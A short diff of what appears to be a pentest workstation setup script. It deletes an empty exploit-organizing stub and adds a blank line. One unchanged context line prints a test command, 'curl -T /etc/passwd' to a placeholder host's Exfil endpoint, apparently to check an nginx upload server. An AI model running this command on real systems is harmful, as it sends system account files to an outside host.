@@ -117,24 +117,6 @@ nginx_config() {
     print_message "good" "curl -T /etc/passwd http://<ip>:8443/Exfil/testfile.txt ; tail -n 1 /var/www/uploads/Exfil/testfile.txt"
 }
 
-exploit_organize() {
-    """This is meant to be the main (globa) function holder for the organization of exploits into their respective directories"""
-    #TODO: Pull out the directory creation functions and place them within here
-
-    function ad_org {
-
-    }
-
-    function linux_org {
-
-    }
-
-
-    function windows_org {
-
-    }
-
-}
 
 peas_download() {
     # For the time being - just scrub the PEAS directory and re-obtain
@@ -497,3 +479,4 @@ vscodium_install() {
     run_and_log sudo apt install codium -y
     print_message "green" "VSCodium installed"
 }
+
